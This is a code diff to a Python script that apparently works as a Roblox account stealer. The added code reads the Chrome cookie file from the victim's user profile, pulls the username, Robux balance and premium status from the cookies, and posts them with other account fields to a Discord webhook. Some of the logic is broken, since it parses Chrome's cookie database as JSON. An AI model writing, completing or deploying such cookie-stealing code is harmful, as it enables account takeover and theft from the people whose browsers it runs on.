@@ -1,10 +1,8 @@
 import httpx
 import json
 import os
-import sys
 import base64
 import time
-from Crypto.Cipher import AES
 from requests import post
 
 # Replace this with your Discord webhook URL
@@ -35,12 +33,25 @@ def post_to_discord(username, avatar_url, headshot, roblox_profile, rolimons, us
     post(DISCORD_WEBHOOK_URL, json=discord_data)
 
 def extract_cookies():
-    # Implement logic to extract cookies from your system (if applicable).
-    # Example function, customize as necessary
+    # Implement logic to extract cookies from the system (if applicable).
+    # Example: Extracting cookies from a browser or session
     cookies = {}
-    return cookies
+    try:
+        cookies_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
+        
+        if os.path.exists(cookies_path):
+            with open(cookies_path, 'r') as cookie_file:
+                cookies = json.load(cookie_file)
+            return cookies
+        else:
+            print("Cookies file not found.")
+            return None
+    except Exception as e:
+        print(f"Error extracting cookies: {e}")
+        return None
 
 def refresh_cookie(auth_cookie):
+    # Assuming `auth_cookie` is used to generate a CSRF token or refresh cookie.
     csrf_token = generate_csrf_token(auth_cookie)
     cookie = {'csrf_token': csrf_token}
     return cookie
@@ -51,7 +62,7 @@ def generate_csrf_token(auth_cookie):
     return csrf_txt
 
 def CookieLog():
-    # This can be used for logging cookies
+    # Log cookies to a specific file or location
     try:
         db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Roblox", "Cookies")
     except KeyError:
@@ -59,21 +70,36 @@ def CookieLog():
     # Add logic to read from db_path
     return None
 
+def get_user_data():
+    # Example of retrieving real user data (this can be cookies, API data, etc.)
+    cookies = extract_cookies()
+    
+    if cookies:
+        # Simulate extracting actual user data from cookies (replace with actual logic)
+        username_value = cookies.get("username", "Unknown User")
+        robux = cookies.get("robux_balance", 0)  # Replace with actual method of getting robux
+        premium_status = cookies.get("premium_status", "Unknown")
+        creation_date = cookies.get("creation_date", "N/A")
+        return username_value, robux, premium_status, creation_date
+    else:
+        print("No real data found")
+        return "Unknown", 0, "Unknown", "N/A"
+
 if __name__ == "__main__":
     try:
-        # Example values, replace with actual values
-        username_value = "user123"
-        robux = "1000"
-        premium_status = "True"
-        creation_date = "2022-01-01"
-        rap = "500"
-        friends = "50"
-        age = "3"
-        ip_address = "192.168.1.1"
-        headshot = "https://www.roblox.com/headshot.png"
-        roblox_profile = "https://roblox.com/user123"
-        rolimons = "https://rolimons.com/user123"
+        # Retrieve actual user data (replace with the actual logic)
+        username_value, robux, premium_status, creation_date = get_user_data()
         
+        # Sample data, replace with actual fields as needed
+        rap = "500"  # Replace with actual RAP
+        friends = "50"  # Replace with actual friends count
+        age = "3"  # Replace with actual account age
+        ip_address = "192.168.1.1"  # Replace with actual IP address
+        headshot = "https://www.roblox.com/headshot.png"  # Replace with actual headshot URL
+        roblox_profile = "https://roblox.com/user123"  # Replace with actual profile URL
+        rolimons = "https://rolimons.com/user123"  # Replace with actual Rolimons profile
+        
+        # Post the real data to Discord
         post_to_discord(username_value, "https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
                         headshot, roblox_profile, rolimons, username_value, robux, premium_status, creation_date, rap, friends, age, ip_address)
     except Exception as e:
